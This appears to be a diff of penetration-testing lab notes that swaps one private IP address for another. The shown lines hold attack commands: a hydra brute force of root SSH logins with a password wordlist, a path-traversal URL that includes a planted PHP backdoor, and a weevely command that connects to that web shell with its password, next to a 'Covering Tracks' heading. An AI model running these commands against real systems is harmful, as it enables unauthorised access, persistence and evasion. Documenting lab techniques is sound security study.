@@ -161,7 +161,7 @@ bash -i
 
 ## Gaining Access
 ```
-hydra -l root -P /opt/rockyou.txt ssh://192.168.88.51:22
+hydra -l root -P /opt/rockyou.txt ssh://192.168.1.1:22
 ```
 
 -l = Username
@@ -232,7 +232,7 @@ vim /usr/databases/post_exploitation_backdoored.php
 http://192.168.1.1/view.php?page=../../usr/databases/post_exploitation_backdoored.php
 ```
 ```
-sudo weevely http://192.168.88.51/view.php?page=../../tmp/backdoored.php b@cKd00r3d
+sudo weevely http://192.168.1.1/view.php?page=../../tmp/backdoored.php b@cKd00r3d
 ```
 
 ## Covering Tracks
